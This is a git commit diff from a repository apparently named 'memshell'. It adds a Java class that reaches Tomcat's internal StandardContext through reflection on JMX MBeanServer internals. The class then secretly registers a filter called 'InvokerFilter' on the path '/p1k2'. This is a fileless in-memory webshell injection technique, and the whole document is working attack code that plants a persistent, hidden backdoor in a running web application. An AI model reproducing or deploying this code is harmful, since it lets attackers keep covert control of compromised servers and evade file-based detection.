9798081498b2a3ba8f2e3258f04125a99ad9e2b1
RE0 <sev7enman@gmail.com>
2021-07-14 11:38:10 +0800

    recognized

--- memshell/src/main/java/com/sorry/bug/tomcat/Filter_noRequest.java
+++ memshell/src/main/java/com/sorry/bug/tomcat/Filter_noRequest.java
@@ -1,7 +1,122 @@
 package com.sorry.bug.tomcat;
 
+import com.sorry.bug.CustomFilter;
+import com.sun.jmx.mbeanserver.NamedObject;
+import com.sun.jmx.mbeanserver.Repository;
+import org.apache.catalina.Context;
+import org.apache.catalina.core.ApplicationFilterConfig;
+import org.apache.catalina.core.StandardContext;
+import org.apache.tomcat.util.modeler.Registry;
+
+import javax.management.DynamicMBean;
+import javax.management.MBeanServer;
+import javax.management.ObjectName;
+import javax.servlet.*;
+import java.io.IOException;
+import java.lang.reflect.Constructor;
+import java.lang.reflect.Field;
+import java.util.HashMap;
+import java.util.Iterator;
+import java.util.Set;
+
 /**
  * created by 0x22cb7139 on 2021/7/12
  */
-public class Filter_noRequest {
+
+/*
+com.sun.jmx.mbeanserver.JmxMBeanServer
+->com.sun.jmx.interceptor.DefaultMBeanServerInterceptor
+->com.sun.mbeanServer.Repository
+->org.apache.tomcat.util.modeler.BaseModelMBean
+->org.apache.catalina.authenticator.AuthenticatorBase
+->StrandredContext
+ */
+public class Filter_noRequest implements Filter{
+    @Override
+    public void init(FilterConfig filterConfig) throws ServletException {
+
+    }
+
+    @Override
+    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
+        try{
+            String filterName = "InvokerFilter";
+            String urlPattern = "/p1k2";
+            MBeanServer mBeanServer = Registry.getRegistry(null,null).getMBeanServer();
+            Field field = Class.forName("com.sun.jmx.mbeanserver.JmxMBeanServer").getDeclaredField("mbsInterceptor");
+            field.setAccessible(true);
+            Object obj = field.get(mBeanServer);
+            field = Class.forName("com.sun.jmx.interceptor.DefaultMBeanServerInterceptor").getDeclaredField("repository");
+            field.setAccessible(true);
+            Repository repository = (Repository) field.get(obj);
+
+            Set<NamedObject> objectSet =  repository.query(new ObjectName("Catalina:host=localhost,name=NonLoginAuthenticator,type=Valve,*"), null);
+            Iterator<NamedObject> iterator = objectSet.iterator();
+            while(iterator.hasNext()) {
+                try {
+                    DynamicMBean dynamicMBean = iterator.next().getObject();
+                    field = Class.forName("org.apache.tomcat.util.modeler.BaseModelMBean").getDeclaredField("resource");
+                    field.setAccessible(true);
+                    obj = field.get(dynamicMBean);
+
+                    field = Class.forName("org.apache.catalina.authenticator.AuthenticatorBase").getDeclaredField("context");
+                    field.setAccessible(true);
+                    StandardContext standardContext = (StandardContext) field.get(obj);
+
+                    field = standardContext.getClass().getDeclaredField("filterConfigs");
+                    field.setAccessible(true);
+                    HashMap<String, ApplicationFilterConfig> map = (HashMap<String, ApplicationFilterConfig>) field.get(standardContext);
+
+                    if (map.get(filterName) == null) {
+                        System.out.println("[+] Add Dynamic Filter");
+
+                        Class filterDefClass = null;
+                        try {
+                            filterDefClass = Class.forName("org.apache.catalina.deploy.FilterDef");
+                        } catch (ClassNotFoundException e) {
+                            filterDefClass = Class.forName("org.apache.tomcat.util.descriptor.web.FilterDef");
+                        }
+
+                        Object filterDef = filterDefClass.newInstance();
+                        filterDef.getClass().getDeclaredMethod("setFilterName", new Class[]{String.class}).invoke(filterDef, new Object[]{filterName});
+                        Filter filter = new CustomFilter();
+
+                        filterDef.getClass().getDeclaredMethod("setFilterClass", new Class[]{String.class}).invoke(filterDef, new Object[]{filter.getClass().getName()});
+                        filterDef.getClass().getDeclaredMethod("setFilter", new Class[]{Filter.class}).invoke(filterDef, new Object[]{filter});
+                        standardContext.getClass().getDeclaredMethod("addFilterDef", new Class[]{filterDefClass}).invoke(standardContext, new Object[]{filterDef});
+
+                        Class filterMapClass = null;
+                        try {
+                            filterMapClass = Class.forName("org.apache.catalina.deploy.FilterMap");
+                        } catch (ClassNotFoundException e) {
+                            filterMapClass = Class.forName("org.apache.tomcat.util.descriptor.web.FilterMap");
+                        }
+
+                        Object filterMap = filterMapClass.newInstance();
+                        filterMap.getClass().getDeclaredMethod("setFilterName", new Class[]{String.class}).invoke(filterMap, new Object[]{filterName});
+                        filterMap.getClass().getDeclaredMethod("setDispatcher", new Class[]{String.class}).invoke(filterMap, new Object[]{DispatcherType.REQUEST.name()});
+                        filterMap.getClass().getDeclaredMethod("addURLPattern", new Class[]{String.class}).invoke(filterMap, new Object[]{urlPattern});
+                        standardContext.getClass().getDeclaredMethod("addFilterMapBefore", new Class[]{filterMapClass}).invoke(standardContext, new Object[]{filterMap});
+                        
+                        Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(new Class[]{Context.class, filterDefClass});
+                        constructor.setAccessible(true);
+                        ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(new Object[]{standardContext, filterDef});
+                        map.put(filterName, filterConfig);
+                    }
+                }catch (Exception e){
+                    //
+                }
+            }
+
+        } catch (Exception e){
+            e.printStackTrace();
+        }
+
+        filterChain.doFilter(servletRequest,servletResponse);
+    }
+
+    @Override
+    public void destroy() {
+
+    }
 }
